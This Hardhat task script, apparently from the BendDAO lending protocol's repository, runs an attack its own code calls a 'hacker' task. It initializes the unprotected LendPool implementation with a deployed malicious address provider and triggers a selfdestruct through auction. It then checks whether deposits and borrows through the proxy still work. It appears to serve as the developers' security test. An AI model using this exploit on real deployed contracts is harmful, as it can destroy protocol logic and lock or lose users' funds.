import BigNumber from "bignumber.js";
import { BigNumberish } from "ethers";
import { task } from "hardhat/config";
import { ConfigNames, loadPoolConfig } from "../../helpers/configuration";
import { oneEther } from "../../helpers/constants";
import {
  getBendProtocolDataProvider,
  getDeploySigner,
  getLendPool,
  getLendPoolAddressesProvider,
  getLendPoolImpl,
} from "../../helpers/contracts-getters";
import { waitForTx } from "../../helpers/misc-utils";
import { eNetwork } from "../../helpers/types";
import { MaliciousLendPoolAddressProviderFactory } from "../../types";

// LendPool malicious hacker tasks
task("hacker:deploy-lendpool-selfdestruct", "Doing LendPool selfdestruct task")
  .addParam("pool", `Pool name to retrieve configuration, supported: ${Object.values(ConfigNames)}`)
  .setAction(async ({ pool }, DRE) => {
    await DRE.run("set-DRE");

    const network = DRE.network.name as eNetwork;
    const poolConfig = loadPoolConfig(pool);
    const addressesProvider = await getLendPoolAddressesProvider();

    const deployerSigner = await getDeploySigner();
    const deployerAddress = await deployerSigner.getAddress();

    const lendPoolProxy = await getLendPool(await addressesProvider.getLendPool());
    const lendPoolImpl = await getLendPoolImpl();
    console.log("LendPool proxy:", lendPoolProxy.address, "implementation:", lendPoolImpl.address);

    const protocolDataProvider = await getBendProtocolDataProvider(await addressesProvider.getBendDataProvider());
    const allReservesTokens = await protocolDataProvider.getAllReservesTokenDatas();
    const allNftsTokens = await protocolDataProvider.getAllNftsTokenDatas();

    const maliciousProvider = await new MaliciousLendPoolAddressProviderFactory(deployerSigner).deploy();
    console.log("Deloyed maliciousProvider:", maliciousProvider.address);

    await waitForTx(await lendPoolImpl.initialize(maliciousProvider.address));
    console.log("LendPool implementatio initialize:", maliciousProvider.address);

    await waitForTx(await lendPoolImpl.auction(allNftsTokens[0].nftAddress, 1, oneEther.toFixed(0), deployerAddress));
    console.log("LendPool implementatio auction succeed to selfdestruct");

    await waitForTx(
      await lendPoolProxy.deposit(
        allReservesTokens[0].tokenAddress,
        oneEther.multipliedBy(1000).toFixed(0),
        deployerAddress,
        0
      )
    );
    console.log("LendPool deposit succeed after selfdestruct");

    await waitForTx(
      await lendPoolProxy.borrow(
        allReservesTokens[0].tokenAddress,
        oneEther.multipliedBy(1000).toFixed(0),
        allNftsTokens[0].nftAddress,
        101,
        deployerAddress,
        0
      )
    );
    console.log("LendPool borrow succeed after selfdestruct");

    console.log("OK");
  });
